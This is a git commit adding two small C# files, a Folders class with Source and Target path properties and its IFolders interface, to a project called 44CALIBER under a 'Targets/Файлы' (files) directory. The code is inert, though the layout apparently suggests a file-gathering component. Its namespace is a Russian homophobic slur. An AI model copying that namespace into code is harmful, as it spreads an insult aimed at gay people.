0ea121b571859102ba0c8908aea670ca2e7d0b96
Scxr <47886020+Khainaaeh@users.noreply.github.com>
2021-01-07 21:35:15 +0500

    Add files via upload

---
+++ 44CALIBER/Resources/Targets/Файлы/Folders.cs
@@ -0,0 +1,17 @@
+﻿namespace pidoras
+{
+    public partial class GetFiles
+    {
+        public class Folders : IFolders
+        {
+            public string Source { get; private set; }
+            public string Target { get; private set; }
+
+            public Folders(string source, string target)
+            {
+                Source = source;
+                Target = target;
+            }
+        }
+    }
+}
---
+++ 44CALIBER/Resources/Targets/Файлы/IFolders.cs
@@ -0,0 +1,8 @@
+﻿namespace pidoras
+{
+    public interface IFolders
+    {
+        string Source { get; }
+        string Target { get; }
+    }
+}
